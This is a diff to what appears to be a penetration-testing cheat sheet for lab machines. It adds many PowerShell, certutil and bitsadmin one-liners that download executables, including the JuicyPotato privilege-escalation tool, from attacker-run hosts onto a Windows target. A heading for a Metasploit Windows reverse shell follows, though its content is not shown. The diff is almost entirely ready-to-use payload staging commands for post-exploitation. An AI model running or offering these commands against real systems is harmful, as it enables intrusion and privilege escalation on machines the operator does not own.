@@ -2,7 +2,21 @@
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"
 
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.14:7898/file.exe', 'file.exe')"
+
+powershell -c '(Invoke-RestMethod -Uri "http://10.10.14.3:8000/JuicyPotato.exe" -Method Get -OutFile "jp.exe")'
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.14:7898/file.exe' -OutFile 'file.exe'"
+
+powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $stream = [System.IO.StreamReader]::new($url); $content = $stream.ReadToEnd(); Set-Content -Path 'file.exe' -Value $content -Encoding Byte"
+
+powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.10.14:7898/file.exe', 'file.exe')"
+
+powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $request = [System.Net.HttpWebRequest]::Create($url); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $output = [System.IO.File]::Create('file.exe'); $stream.CopyTo($output); $output.Close(); $response.Close()"
+
 certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
+
+bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe
 
 nc
 
@@ -11,6 +25,8 @@ curl
 wget
 
 scp
+
+
 ```
 
 # Metasploit Windows Reverse Shell
